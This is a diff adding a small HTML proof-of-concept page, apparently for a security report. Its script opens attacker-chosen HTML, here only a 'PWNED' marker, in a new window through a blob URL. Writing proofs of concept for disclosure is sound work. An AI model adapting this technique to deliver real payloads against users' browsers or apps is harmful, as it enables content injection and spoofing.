@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head><title>Blob PoC</title></head>
+<body>
+<h1>Opening blob URL...</h1>
+<script>
+  const content = `<h1> PWNED UMAR ZR</h1>`;
+
+  const blob = new Blob([content], { type: "text/html" });
+  const url = URL.createObjectURL(blob);
+  window.open(url);
+</script>
+</body>
+</html>
